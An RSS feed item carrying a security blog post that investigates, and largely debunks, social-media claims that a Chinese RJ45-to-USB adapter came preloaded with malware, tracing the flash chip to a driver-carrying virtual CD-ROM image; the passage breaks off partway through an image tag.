<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Sat, 18 Jan 2025 02:30:03 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Investigating an "Evil" RJ45 Dongle (248 pts)]]></title>
            <link>https://lcamtuf.substack.com/p/investigating-an-evil-rj45-dongle</link>
            <guid>42743033</guid>
            <pubDate>Fri, 17 Jan 2025 20:41:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lcamtuf.substack.com/p/investigating-an-evil-rj45-dongle">https://lcamtuf.substack.com/p/investigating-an-evil-rj45-dongle</a>, See on <a href="https://news.ycombinator.com/item?id=42743033">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><p>When it comes to information security headlines, a good rule of thumb is that claims about about widespread supply-chain sabotage are usually false. It’s not that attacks of this sort can’t happen; it’s that they’re complicated, time-consuming, and risky to pull off. It’s what you use when you’re out of options. Most of the time, it’s much simpler to steal credentials or get someone to download a malicious file.</p><p>Earlier this week, a young entrepreneur caused stir on social media by suggesting that an Ethernet-to-USB they purchased from China was preloaded with malware that “evaded virtual machines”, “captured keystrokes”, and “used Russian-language elements”. </p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd40dc9c2-9d33-4cfd-bdac-05c4f5d481d4_1006x850.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd40dc9c2-9d33-4cfd-bdac-05c4f5d481d4_1006x850.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd40dc9c2-9d33-4cfd-bdac-05c4f5d481d4_1006x850.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd40dc9c2-9d33-4cfd-bdac-05c4f5d481d4_1006x850.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd40dc9c2-9d33-4cfd-bdac-05c4f5d481d4_1006x850.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd40dc9c2-9d33-4cfd-bdac-05c4f5d481d4_1006x850.jpeg" width="1006" height="850" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/d40dc9c2-9d33-4cfd-bdac-05c4f5d481d4_1006x850.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:850,&quot;width&quot;:1006,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;Image&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="Image" title="Image" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd40dc9c2-9d33-4cfd-bdac-05c4f5d481d4_1006x850.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd40dc9c2-9d33-4cfd-bdac-05c4f5d481d4_1006x850.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd40dc9c2-9d33-4cfd-bdac-05c4f5d481d4_1006x850.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd40dc9c2-9d33-4cfd-bdac-05c4f5d481d4_1006x850.jpeg 1456w" sizes="100vw" fetchpriority="high"></picture></div></a><figcaption><em>OK, it did not say that.</em></figcaption></figure></div><p><span>The revelations have gotten millions of views, but details were quite hazy. The poster shared an </span><a href="https://www.hybrid-analysis.com/sample/e3f57d5ebc882a0a0ca96f9ba244fe97fb1a02a3297335451b9c5091332fe359/6783acb889e814045f0a2da6" rel="">ambiguous antivirus scan report</a><span> from Crowdstrike Falcon, but that seemed to be a red herring: the binary was a self-extracting EXE created using 7-Zip, a well-known open-source archiver authored by Ivan Pavlov. The author’s nationality accounted for the ominous “Russian-language elements”; the nature of self-extracting archives that install drivers explained most of the rest. Finally, the contents of the archive seemed to match a signed, publicly-available 2.0.7.0 driver for an RJ45-to-USB chip made by CoreChips Shenzhen — a company that also calls itself Corechip Semiconductor in the accompanying </span><em>.inf</em><span> file.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fea8ac2ef-104d-43d4-979e-70813bc74da3_1900x1153.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fea8ac2ef-104d-43d4-979e-70813bc74da3_1900x1153.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fea8ac2ef-104d-43d4-979e-70813bc74da3_1900x1153.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fea8ac2ef-104d-43d4-979e-70813bc74da3_1900x1153.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fea8ac2ef-104d-43d4-979e-70813bc74da3_1900x1153.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fea8ac2ef-104d-43d4-979e-70813bc74da3_1900x1153.png" width="1456" height="884" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/ea8ac2ef-104d-43d4-979e-70813bc74da3_1900x1153.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:884,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:78230,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fea8ac2ef-104d-43d4-979e-70813bc74da3_1900x1153.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fea8ac2ef-104d-43d4-979e-70813bc74da3_1900x1153.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fea8ac2ef-104d-43d4-979e-70813bc74da3_1900x1153.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fea8ac2ef-104d-43d4-979e-70813bc74da3_1900x1153.png 1456w" sizes="100vw"></picture></div></a><figcaption><em>Yeah, it’s pretty much supposed to do that stuff.</em></figcaption></figure></div><p><span>The driver referenced a chip named </span><a href="https://wmsc.lcsc.com/wmsc/upload/file/pdf/v2/lcsc/1912111437_CoreChips-SR9900_C403645.pdf" rel="">SR9900</a><span>; virtually no publicly-available info is available about the chip or its maker, but after some sleuthing, I believe it’s a direct clone of </span><a href="https://www1.futureelectronics.com/doc/Realtek/Realtek-Semicon-RTL8152B-VB-CG_C50656.pdf" rel="">Realtek RTL8152B</a><span>. The English-language product brief implies that “SR” stands for “Supereal”; that brand name comes up in the context of </span><a href="https://zeptobars.com/en/read/FTDI-FT232RL-real-vs-fake-supereal" rel="">counterfeit FTDI FT232RL chips</a><span> that plagued the industry some time ago.</span></p><p>Other than the potential for IP tomfoolery, the lineage of the chip is important because the original Realtek design is pretty old; the datasheet was released in 2013. The devices support 100BASE-TX and USB 2.0, and hearken back to the era of Windows 7. This was an awkward period when CD-ROM drives were going out of fashion, but not every computer could be assumed to be permanently online. It made sense for some gadgets to present themselves as mass storage devices containing their own drivers — and from the security standpoint, it wasn’t better or worse than any other ad-hoc way to deliver the file.</p><p><span>In other words, given the historical context, nothing about the driver seemed particularly odd. That said, the poster implied there’s more to the story: they shared teardown photos and pointed to a sparsely-populated PCB with a </span><a href="https://ww1.microchip.com/downloads/en/DeviceDoc/SST25VF040B-4-Mbit-SPI-Serial-Flash-Data-Sheet-20005051F.pdf" rel="">25x40-type</a><span> serial flash IC mounted next to the aforementioned SR9900:</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa1ceee71-b1dd-490b-ac7e-2616ff5cbd48_1600x1200.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa1ceee71-b1dd-490b-ac7e-2616ff5cbd48_1600x1200.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa1ceee71-b1dd-490b-ac7e-2616ff5cbd48_1600x1200.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa1ceee71-b1dd-490b-ac7e-2616ff5cbd48_1600x1200.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa1ceee71-b1dd-490b-ac7e-2616ff5cbd48_1600x1200.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa1ceee71-b1dd-490b-ac7e-2616ff5cbd48_1600x1200.jpeg" width="1456" height="1092" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/a1ceee71-b1dd-490b-ac7e-2616ff5cbd48_1600x1200.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1092,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;Image&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="Image" title="Image" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa1ceee71-b1dd-490b-ac7e-2616ff5cbd48_1600x1200.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa1ceee71-b1dd-490b-ac7e-2616ff5cbd48_1600x1200.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa1ceee71-b1dd-490b-ac7e-2616ff5cbd48_1600x1200.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa1ceee71-b1dd-490b-ac7e-2616ff5cbd48_1600x1200.jpeg 1456w" sizes="100vw"></picture></div></a><figcaption><em>One of the original teardown pics. From social media.</em></figcaption></figure></div><p><span>Why did the device need 512 kB of flash memory? Was this for firmware, or was it where </span><em>they </em><span>kept our stolen packets?… To be clear, it’s not wrong to ask! Malicious hardware has plenty of precedent: it’s been used by intelligence agencies and private pentesters alike. Heck, a bit over a decade ago, I built an </span><a href="https://lcamtuf.coredump.cx/plasma_globe/" rel="">evil plasma globe</a><span> for work. Still, we weren’t here to debate whether a malicious RJ45-to-USB adapter </span><em>could</em><span> be made. The important question was whether in this particular instance — as the poster put it — “the Chinese were at it again”.</span></p><p>Unfortunately, the specs for SR9900 and RTL8152B are equally vague about the purpose of the companion flash IC. I dug up the following architectural outline, but it didn’t offer any special insights:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c445094-5d87-4999-95b0-877ae396aa65_1513x1056.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c445094-5d87-4999-95b0-877ae396aa65_1513x1056.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c445094-5d87-4999-95b0-877ae396aa65_1513x1056.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c445094-5d87-4999-95b0-877ae396aa65_1513x1056.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c445094-5d87-4999-95b0-877ae396aa65_1513x1056.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c445094-5d87-4999-95b0-877ae396aa65_1513x1056.png" width="1456" height="1016" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/0c445094-5d87-4999-95b0-877ae396aa65_1513x1056.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1016,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:119026,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c445094-5d87-4999-95b0-877ae396aa65_1513x1056.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c445094-5d87-4999-95b0-877ae396aa65_1513x1056.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c445094-5d87-4999-95b0-877ae396aa65_1513x1056.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c445094-5d87-4999-95b0-877ae396aa65_1513x1056.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption><em>CoreChips SR9900 architecture, from the product brief.</em></figcaption></figure></div><p>Image search for schematics proved to be another dead end; I found several designs featuring the original Realtek chip, but there was nothing hooked up to the serial pins:</p><p><span>I was ready to head over to the Dark Web (</span><em>amazon.com</em><span>) and purchase one of the dongles just to dump the contents of the memory chip. The Serial Peripheral Interface (SPI) bus is trivial to work with: in essence, you supply a clock signal at any speed you like; pressing a button by hand would do. At the rising edge of every clock cycle, the peripheral reads one bit on the “serial in” line, while the host reads one “serial out” bit back. There are no handshakes, headers, parity bits, or control flow.</span></p><p>The “application” protocol of the flash chip equally simple and is common to almost all serial memory ICs. To get things going, the host sends a 1-byte READ instruction (0x03), followed by three address bytes. The chip starts sending data immediately after receiving the entire four-byte sequence, and keeps streaming bits for as long as the host clock signal is supplied:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F360f9323-2014-41f3-b8a0-f2d1332df7c5_2021x620.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F360f9323-2014-41f3-b8a0-f2d1332df7c5_2021x620.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F360f9323-2014-41f3-b8a0-f2d1332df7c5_2021x620.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F360f9323-2014-41f3-b8a0-f2d1332df7c5_2021x620.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F360f9323-2014-41f3-b8a0-f2d1332df7c5_2021x620.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F360f9323-2014-41f3-b8a0-f2d1332df7c5_2021x620.png" width="1456" height="447" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/360f9323-2014-41f3-b8a0-f2d1332df7c5_2021x620.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:447,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:108659,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F360f9323-2014-41f3-b8a0-f2d1332df7c5_2021x620.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F360f9323-2014-41f3-b8a0-f2d1332df7c5_2021x620.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F360f9323-2014-41f3-b8a0-f2d1332df7c5_2021x620.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F360f9323-2014-41f3-b8a0-f2d1332df7c5_2021x620.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption><em>Serial memory read protocol. From the Microchip 25x40 spec.</em></figcaption></figure></div><p><span>But then, with the item in my cart, I had an epiphany: I went to the website of CoreChips and used Google Translate to pinpoint the original Chinese text for the “</span><em>SR9900 series chip Windows system mass production tool</em><span>”. I searched for the matching string and found a couple of old Chinese-language forum threads; one of them led me to a password-protected and paywalled download named “</span><em>SR9900(A)设计资料1018.rar</em><span>” . Some $2.99 later, I was the happy owner of an archive containing a very retro-looking SR9900 production tool:</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff60529ac-79c9-4df1-9968-8cad918a286b_1755x1198.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff60529ac-79c9-4df1-9968-8cad918a286b_1755x1198.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff60529ac-79c9-4df1-9968-8cad918a286b_1755x1198.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff60529ac-79c9-4df1-9968-8cad918a286b_1755x1198.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff60529ac-79c9-4df1-9968-8cad918a286b_1755x1198.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff60529ac-79c9-4df1-9968-8cad918a286b_1755x1198.png" width="1456" height="994" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/f60529ac-79c9-4df1-9968-8cad918a286b_1755x1198.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:994,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:419079,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff60529ac-79c9-4df1-9968-8cad918a286b_1755x1198.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff60529ac-79c9-4df1-9968-8cad918a286b_1755x1198.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff60529ac-79c9-4df1-9968-8cad918a286b_1755x1198.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff60529ac-79c9-4df1-9968-8cad918a286b_1755x1198.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption><em>Ah, to be young again…</em></figcaption></figure></div><p><span>With it, came a 168 kB ISO 9660 (!) filesystem image containing a self-extracting Windows driver; the programming tool puts the .</span><em>iso</em><span> file verbatim onto the SPI flash. Yep: the chip just acts as a “software-defined” CD-ROM, a drop-in replacement for the physical media you’d have gotten with such gear before. You can download the disk image </span><a href="https://lcamtuf.coredump.cx/blog/sr9900-iso.7z" rel="">here</a><span>; the password is “rj45”.</span></p><p>As an aside, the CD-ROM image was created with “ULTRAISO V9.3 CD &amp; DVD CREATOR, (C) EZB SYSTEMS” — another decidedly retro piece straight from the days of Windows XP:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682cf005-07d6-465f-9c29-c8890c5a4769_785x574.gif" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_lossy/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682cf005-07d6-465f-9c29-c8890c5a4769_785x574.gif 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_lossy/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682cf005-07d6-465f-9c29-c8890c5a4769_785x574.gif 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_lossy/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682cf005-07d6-465f-9c29-c8890c5a4769_785x574.gif 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_lossy/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682cf005-07d6-465f-9c29-c8890c5a4769_785x574.gif 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_lossy/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682cf005-07d6-465f-9c29-c8890c5a4769_785x574.gif" width="785" height="574" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/682cf005-07d6-465f-9c29-c8890c5a4769_785x574.gif&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:574,&quot;width&quot;:785,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_lossy/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F682cf005-07d6-465f-9c29-c8890c5a4769_785x574.gif 424w, 